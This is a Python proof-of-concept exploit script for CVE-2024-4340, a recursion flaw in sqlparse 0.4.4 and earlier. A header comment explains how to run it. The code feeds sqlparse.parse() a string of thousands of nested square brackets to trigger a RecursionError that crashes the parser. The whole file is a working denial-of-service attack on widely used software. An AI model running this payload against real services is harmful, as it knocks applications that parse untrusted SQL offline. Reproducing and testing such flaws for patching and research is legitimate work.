# exploit.py - PoC for CVE-2024-4340 (sqlparse 0.4.4 Uncontrolled Recursion)
#
# INPUT FORMAT:
#     python exploit.py <depth>
#
# <depth> : Integer specifying how many opening square brackets '[' (and
#           corresponding closing ']') will be produced.  A value of 10000 or
#           larger will normally exceed Python's default recursion limit (≈1000)
#           and trigger the vulnerability, crashing sqlparse with a
#           RecursionError.  Example:
#               python exploit.py 10000
#
# The script builds a string consisting of <depth> '[' characters followed by
# the same number of ']' characters, then feeds it to sqlparse.parse().  On a
# vulnerable version (≤0.4.4) this causes uncontrolled recursion inside
# TokenList.flatten(), leading to an uncaught RecursionError and denial of
# service.

import sys
import sqlparse

if len(sys.argv) != 2:
    print('Usage: python exploit.py <depth>')
    sys.exit(1)

try:
    depth = int(sys.argv[1])
except ValueError:
    print('Depth must be an integer')
    sys.exit(1)

payload = '[' * depth + ']' * depth

# This call will raise RecursionError on vulnerable versions (≤0.4.4)
sqlparse.parse(payload)